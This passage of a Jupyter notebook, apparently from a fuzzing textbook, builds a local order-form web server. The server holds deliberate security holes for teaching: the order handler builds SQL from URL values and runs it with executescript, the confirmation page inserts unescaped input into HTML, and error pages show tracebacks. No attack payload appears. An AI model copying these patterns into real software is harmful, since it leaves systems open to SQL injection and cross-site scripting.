     "iopub.status.idle": "2021-12-13T14:45:30.784501Z",
     "shell.execute_reply": "2021-12-13T14:45:30.784867Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import urllib.parse"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.789020Z",
     "iopub.status.busy": "2021-12-13T14:45:30.788459Z",
     "iopub.status.idle": "2021-12-13T14:45:30.790133Z",
     "shell.execute_reply": "2021-12-13T14:45:30.790651Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def get_field_values(self):\n",
    "        # Note: this fails to decode non-ASCII characters properly\n",
    "        query_string = urllib.parse.urlparse(self.path).query\n",
    "\n",
    "        # fields is { 'item': ['tshirt'], 'name': ['Jane Doe'], ...}\n",
    "        fields = urllib.parse.parse_qs(query_string, keep_blank_values=True)\n",
    "\n",
    "        values = {}\n",
    "        for key in fields:\n",
    "            values[key] = fields[key][0]\n",
    "\n",
    "        return values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The method `handle_order()` takes these values from the URL, stores the order, and returns a page confirming the order.  If anything goes wrong, it sends an internal server error."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.794546Z",
     "iopub.status.busy": "2021-12-13T14:45:30.793954Z",
     "iopub.status.idle": "2021-12-13T14:45:30.795438Z",
     "shell.execute_reply": "2021-12-13T14:45:30.795881Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def handle_order(self):\n",
    "        values = self.get_field_values()\n",
    "        self.store_order(values)\n",
    "        self.send_order_received(values)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Storing the order makes use of the database connection defined above; we create an SQL command instantiated with the values as extracted from the URL."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.800083Z",
     "iopub.status.busy": "2021-12-13T14:45:30.799521Z",
     "iopub.status.idle": "2021-12-13T14:45:30.801266Z",
     "shell.execute_reply": "2021-12-13T14:45:30.801753Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def store_order(self, values):\n",
    "        db = sqlite3.connect(ORDERS_DB)\n",
    "        # The following should be one line\n",
    "        sql_command = \"INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')\".format(**values)\n",
    "        self.log_message(\"%s\", sql_command)\n",
    "        db.executescript(sql_command)\n",
    "        db.commit()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "After storing the order, we send the confirmation HTML page, which again is instantiated with the values from the URL."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.806066Z",
     "iopub.status.busy": "2021-12-13T14:45:30.805547Z",
     "iopub.status.idle": "2021-12-13T14:45:30.807244Z",
     "shell.execute_reply": "2021-12-13T14:45:30.807616Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def send_order_received(self, values):\n",
    "        # Should use html.escape()\n",
    "        values[\"item_name\"] = FUZZINGBOOK_SWAG[values[\"item\"]]\n",
    "        confirmation = HTML_ORDER_RECEIVED.format(**values).encode(\"utf8\")\n",
    "\n",
    "        self.send_response(HTTPStatus.OK, \"Order received\")\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "        self.wfile.write(confirmation)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Other HTTP commands\n",
    "\n",
    "Besides the `GET` command (which does all the heavy lifting), HTTP servers can also support other HTTP commands; we support the `HEAD` command, which returns the head information of a Web page.  In our case, this is always empty."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.811182Z",
     "iopub.status.busy": "2021-12-13T14:45:30.810673Z",
     "iopub.status.idle": "2021-12-13T14:45:30.812812Z",
     "shell.execute_reply": "2021-12-13T14:45:30.813248Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def do_HEAD(self):\n",
    "        # print(\"HEAD \" + self.path)\n",
    "        self.send_response(HTTPStatus.OK)\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Error Handling\n",
    "\n",
    "We have defined pages for submitting and processing orders; now we also need a few pages for errors that might occur."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Page Not Found\n",
    "\n",
    "This page is displayed if a non-existing page (i.e. anything except `/` or `/order`) is requested."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.816823Z",
     "iopub.status.busy": "2021-12-13T14:45:30.816202Z",
     "iopub.status.idle": "2021-12-13T14:45:30.817971Z",
     "shell.execute_reply": "2021-12-13T14:45:30.818366Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "HTML_NOT_FOUND = \"\"\"\n",
    "<html><body>\n",
    "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Sorry.</strong>\n",
    "  <p>\n",
    "  This page does not exist.  Try our <a href=\"/\">order form</a> instead.\n",
    "  </p>\n",
    "</div>\n",
    "</body></html>\n",
    "  \"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.821827Z",
     "iopub.status.busy": "2021-12-13T14:45:30.821311Z",
     "iopub.status.idle": "2021-12-13T14:45:30.823922Z",
     "shell.execute_reply": "2021-12-13T14:45:30.824296Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Sorry.</strong>\n",
       "  <p>\n",
       "  This page does not exist.  Try our <a href=\"/\">order form</a> instead.\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_NOT_FOUND)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "The method `not_found()` takes care of sending this out with the appropriate HTTP status code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.828154Z",
     "iopub.status.busy": "2021-12-13T14:45:30.827642Z",
     "iopub.status.idle": "2021-12-13T14:45:30.829269Z",
     "shell.execute_reply": "2021-12-13T14:45:30.829633Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def not_found(self):\n",
    "        self.send_response(HTTPStatus.NOT_FOUND, \"Not found\")\n",
    "\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "\n",
    "        message = HTML_NOT_FOUND\n",
    "        self.wfile.write(message.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Internal Errors\n",
    "\n",
    "This page is shown for any internal errors that might occur.  For diagnostic purposes, we have it include the traceback of the failing function."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.832921Z",
     "iopub.status.busy": "2021-12-13T14:45:30.832392Z",
     "iopub.status.idle": "2021-12-13T14:45:30.834123Z",
     "shell.execute_reply": "2021-12-13T14:45:30.834492Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTML_INTERNAL_SERVER_ERROR = \"\"\"\n",
    "<html><body>\n",
    "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
    "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
    "  <p>\n",
    "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
    "  <pre>{error_message}</pre>\n",
    "  </p>\n",
    "</div>\n",
    "</body></html>\n",
    "  \"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.838336Z",
     "iopub.status.busy": "2021-12-13T14:45:30.837722Z",
     "iopub.status.idle": "2021-12-13T14:45:30.840125Z",
     "shell.execute_reply": "2021-12-13T14:45:30.840494Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "<html><body>\n",
       "<div style=\"border:3px; border-style:solid; border-color:#FF0000; padding: 1em;\">\n",
       "  <strong id=\"title\" style=\"font-size: x-large\">Internal Server Error</strong>\n",
       "  <p>\n",
       "  The server has encountered an internal error.  Go to our <a href=\"/\">order form</a>.\n",
       "  <pre>{error_message}</pre>\n",
       "  </p>\n",
       "</div>\n",
       "</body></html>\n",
       "  "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "execution_count": 35,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "HTML(HTML_INTERNAL_SERVER_ERROR)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.843383Z",
     "iopub.status.busy": "2021-12-13T14:45:30.842871Z",
     "iopub.status.idle": "2021-12-13T14:45:30.844538Z",
     "shell.execute_reply": "2021-12-13T14:45:30.844910Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import sys\n",
    "import traceback"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.849347Z",
     "iopub.status.busy": "2021-12-13T14:45:30.848812Z",
     "iopub.status.idle": "2021-12-13T14:45:30.850366Z",
     "shell.execute_reply": "2021-12-13T14:45:30.850847Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def internal_server_error(self):\n",
    "        self.send_response(HTTPStatus.INTERNAL_SERVER_ERROR, \"Internal Error\")\n",
    "\n",
    "        self.send_header(\"Content-type\", \"text/html\")\n",
    "        self.end_headers()\n",
    "\n",
    "        exc = traceback.format_exc()\n",
    "        self.log_message(\"%s\", exc.strip())\n",
    "\n",
    "        message = HTML_INTERNAL_SERVER_ERROR.format(error_message=exc)\n",
    "        self.wfile.write(message.encode(\"utf8\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Logging\n",
    "\n",
    "Our server runs as a separate process in the background, waiting to receive commands at all time.  To see what it is doing, we implement a special logging mechanism.  The `httpd_message_queue` establishes a queue into which one process (the server) can store Python objects, and in which another process (the notebook) can retrieve them.  We use this to pass log messages from the server, which we can then display in the notebook."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "For multiprocessing, we use the `multiprocess` module - a variant of the standard Python `multiprocessing` module that also works in notebooks. If you are running this code outside of a notebook, you can also use `multiprocessing` instead."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.854587Z",
     "iopub.status.busy": "2021-12-13T14:45:30.853960Z",
     "iopub.status.idle": "2021-12-13T14:45:30.868913Z",
     "shell.execute_reply": "2021-12-13T14:45:30.868269Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from multiprocess import Queue  # type: ignore"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.872352Z",
     "iopub.status.busy": "2021-12-13T14:45:30.871751Z",
     "iopub.status.idle": "2021-12-13T14:45:30.878285Z",
     "shell.execute_reply": "2021-12-13T14:45:30.878690Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "HTTPD_MESSAGE_QUEUE = Queue()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us place two messages in the queue:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.882684Z",
     "iopub.status.busy": "2021-12-13T14:45:30.882151Z",
     "iopub.status.idle": "2021-12-13T14:45:30.883944Z",
     "shell.execute_reply": "2021-12-13T14:45:30.884316Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "HTTPD_MESSAGE_QUEUE.put(\"I am another message\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.887417Z",
     "iopub.status.busy": "2021-12-13T14:45:30.886906Z",
     "iopub.status.idle": "2021-12-13T14:45:30.888501Z",
     "shell.execute_reply": "2021-12-13T14:45:30.888867Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "HTTPD_MESSAGE_QUEUE.put(\"I am one more message\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "To distinguish server messages from other parts of the notebook, we format them specially:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.891890Z",
     "iopub.status.busy": "2021-12-13T14:45:30.891339Z",
     "iopub.status.idle": "2021-12-13T14:45:30.892846Z",
     "shell.execute_reply": "2021-12-13T14:45:30.893215Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from bookutils import rich_output, terminal_escape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.896619Z",
     "iopub.status.busy": "2021-12-13T14:45:30.896090Z",
     "iopub.status.idle": "2021-12-13T14:45:30.897792Z",
     "shell.execute_reply": "2021-12-13T14:45:30.898375Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def display_httpd_message(message):\n",
    "    if rich_output():\n",
    "        display(\n",
    "            HTML(\n",
    "                '<pre style=\"background: NavajoWhite;\">' +\n",
    "                message +\n",
    "                \"</pre>\"))\n",
    "    else:\n",
    "        print(terminal_escape(message))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.902149Z",
     "iopub.status.busy": "2021-12-13T14:45:30.901368Z",
     "iopub.status.idle": "2021-12-13T14:45:30.904710Z",
     "shell.execute_reply": "2021-12-13T14:45:30.905084Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">I am a httpd server message</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display_httpd_message(\"I am a httpd server message\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The method `print_httpd_messages()` prints all messages accumulated in the queue so far:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.908535Z",
     "iopub.status.busy": "2021-12-13T14:45:30.908015Z",
     "iopub.status.idle": "2021-12-13T14:45:30.909743Z",
     "shell.execute_reply": "2021-12-13T14:45:30.910111Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def print_httpd_messages():\n",
    "    while not HTTPD_MESSAGE_QUEUE.empty():\n",
    "        message = HTTPD_MESSAGE_QUEUE.get()\n",
    "        display_httpd_message(message)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.913054Z",
     "iopub.status.busy": "2021-12-13T14:45:30.912485Z",
     "iopub.status.idle": "2021-12-13T14:45:30.914279Z",
     "shell.execute_reply": "2021-12-13T14:45:30.914651Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:30.917546Z",
     "iopub.status.busy": "2021-12-13T14:45:30.917017Z",
     "iopub.status.idle": "2021-12-13T14:45:31.925231Z",
     "shell.execute_reply": "2021-12-13T14:45:31.925693Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">I am another message</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<pre style=\"background: NavajoWhite;\">I am one more message</pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "time.sleep(1)\n",
    "print_httpd_messages()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "With `clear_httpd_messages()`, we can silently discard all pending messages:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:31.929845Z",
     "iopub.status.busy": "2021-12-13T14:45:31.929252Z",
     "iopub.status.idle": "2021-12-13T14:45:31.930702Z",
     "shell.execute_reply": "2021-12-13T14:45:31.931084Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def clear_httpd_messages():\n",
    "    while not HTTPD_MESSAGE_QUEUE.empty():\n",
    "        HTTPD_MESSAGE_QUEUE.get()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The method `log_message()` in the request handler makes use of the queue to store its messages:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:31.935900Z",
     "iopub.status.busy": "2021-12-13T14:45:31.935276Z",
     "iopub.status.idle": "2021-12-13T14:45:31.936986Z",
     "shell.execute_reply": "2021-12-13T14:45:31.937365Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "class SimpleHTTPRequestHandler(SimpleHTTPRequestHandler):\n",
    "    def log_message(self, format, *args):\n",
    "        message = (\"%s - - [%s] %s\\n\" %\n",
    "                   (self.address_string(),\n",
    "                    self.log_date_time_string(),\n",
    "                    format % args))\n",
    "        HTTPD_MESSAGE_QUEUE.put(message)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "In [the chapter on carving](Carver.ipynb), we had introduced a `webbrowser()` method which retrieves the contents of the given URL.  We now extend it such that it also prints out any log messages produced by the server:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:31.940404Z",
     "iopub.status.busy": "2021-12-13T14:45:31.939890Z",
     "iopub.status.idle": "2021-12-13T14:45:32.011570Z",
     "shell.execute_reply": "2021-12-13T14:45:32.011962Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.017221Z",
     "iopub.status.busy": "2021-12-13T14:45:32.016442Z",
     "iopub.status.idle": "2021-12-13T14:45:32.018672Z",
     "shell.execute_reply": "2021-12-13T14:45:32.018247Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [],
   "source": [
    "def webbrowser(url, mute=False):\n",
    "    \"\"\"Download the http/https resource given by the URL\"\"\"\n",
    "    import requests  # for imports\n",
    "\n",
    "    try:\n",
    "        r = requests.get(url)\n",
    "        contents = r.text\n",
    "    finally:\n",
    "        if not mute:\n",
    "            print_httpd_messages()\n",
    "        else:\n",
    "            clear_httpd_messages()\n",
    "\n",
    "    return contents"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Running the Server\n",
    "\n",
    "After all these definitions, we are now ready to get the Web server up and running.  We run the server on the *local host* – that is, the same machine which also runs this notebook.  We check for an accessible port and put the resulting URL in the queue created earlier."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {
    "button": false,
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.023675Z",
     "iopub.status.busy": "2021-12-13T14:45:32.022942Z",
     "iopub.status.idle": "2021-12-13T14:45:32.025678Z",
     "shell.execute_reply": "2021-12-13T14:45:32.025194Z"
    },
    "new_sheet": false,
    "run_control": {
     "read_only": false
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "def run_httpd_forever(handler_class):\n",
    "    host = \"127.0.0.1\"  # localhost IP\n",
    "    for port in range(8800, 9000):\n",
    "        httpd_address = (host, port)\n",
    "\n",
    "        try:\n",
    "            httpd = HTTPServer(httpd_address, handler_class)\n",
    "            break\n",
    "        except OSError:\n",
    "            continue\n",
    "\n",
    "    httpd_url = \"http://\" + host + \":\" + repr(port)\n",
    "    HTTPD_MESSAGE_QUEUE.put(httpd_url)\n",
    "    httpd.serve_forever()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "The function `start_httpd()` starts the server in a separate process, which we start using the `multiprocess` module.  It retrieves its URL from the message queue and returns it, such that we can start talking to the server."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.029066Z",
     "iopub.status.busy": "2021-12-13T14:45:32.028417Z",
     "iopub.status.idle": "2021-12-13T14:45:32.030203Z",
     "shell.execute_reply": "2021-12-13T14:45:32.030573Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from multiprocess import Process"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.034159Z",
     "iopub.status.busy": "2021-12-13T14:45:32.033591Z",
     "iopub.status.idle": "2021-12-13T14:45:32.035347Z",
     "shell.execute_reply": "2021-12-13T14:45:32.035722Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def start_httpd(handler_class=SimpleHTTPRequestHandler):\n",
    "    clear_httpd_messages()\n",
    "\n",
    "    httpd_process = Process(target=run_httpd_forever, args=(handler_class,))\n",
    "    httpd_process.start()\n",
    "\n",
    "    httpd_url = HTTPD_MESSAGE_QUEUE.get()\n",
    "    return httpd_process, httpd_url"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Let us now start the server and save its URL:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.039342Z",
     "iopub.status.busy": "2021-12-13T14:45:32.038735Z",
     "iopub.status.idle": "2021-12-13T14:45:32.054659Z",
     "shell.execute_reply": "2021-12-13T14:45:32.055160Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'http://127.0.0.1:8800'"
      ]
     },
     "execution_count": 55,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "httpd_process, httpd_url = start_httpd()\n",
    "httpd_url"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "### Interacting with the Server\n",
    "\n",
    "Let us now access the server just created."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "source": [
    "#### Direct Browser Access\n",
    "\n",
    "If you are running the Jupyter notebook server on the local host as well, you can now access the server directly at the given URL.  Simply open the address in `httpd_url` by clicking on the link below.\n",
    "\n",
    "**Note**: This only works if you are running the Jupyter notebook server on the local host."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.061390Z",
     "iopub.status.busy": "2021-12-13T14:45:32.060858Z",
     "iopub.status.idle": "2021-12-13T14:45:32.062727Z",
     "shell.execute_reply": "2021-12-13T14:45:32.063229Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [],
   "source": [
    "def print_url(url):\n",
    "    if rich_output():\n",
    "        display(HTML('<pre><a href=\"%s\">%s</a></pre>' % (url, url)))\n",
    "    else:\n",
    "        print(terminal_escape(url))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 57,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.067287Z",
     "iopub.status.busy": "2021-12-13T14:45:32.066656Z",
     "iopub.status.idle": "2021-12-13T14:45:32.069536Z",
     "shell.execute_reply": "2021-12-13T14:45:32.070037Z"
    },
    "slideshow": {
     "slide_type": "subslide"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<pre><a href=\"http://127.0.0.1:8800\">http://127.0.0.1:8800</a></pre>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "print_url(httpd_url)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "source": [
    "Even more convenient, you may be able to interact directly with the server using the window below. \n",
    "\n",
    "**Note**: This only works if you are running the Jupyter notebook server on the local host."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.073810Z",
     "iopub.status.busy": "2021-12-13T14:45:32.073125Z",
     "iopub.status.idle": "2021-12-13T14:45:32.074863Z",
     "shell.execute_reply": "2021-12-13T14:45:32.075233Z"
    },
    "slideshow": {
     "slide_type": "skip"
    }
   },
   "outputs": [],
   "source": [
    "from IPython.display import IFrame"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {
    "execution": {
     "iopub.execute_input": "2021-12-13T14:45:32.078715Z",
     "iopub.status.busy": "2021-12-13T14:45:32.078145Z",
     "iopub.status.idle": "2021-12-13T14:45:32.080515Z",
     "shell.execute_reply": "2021-12-13T14:45:32.080881Z"
    },
    "slideshow": {
     "slide_type": "fragment"
    }
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "\n",
       "        <iframe\n",
       "            width=\"100%\"\n",
       "            height=\"230\"\n",
       "            src=\"http://127.0.0.1:8800\"\n",
       "            frameborder=\"0\"\n",
       "            allowfullscreen\n",
       "            \n",
       "        ></iframe>\n",
       "        "
      ],
      "text/plain": [
       "<IPython.lib.display.IFrame at 0x10b400c70>"
      ]
     },
     "execution_count": 59,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "IFrame(httpd_url, '100%', 230)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "fragment"
    }
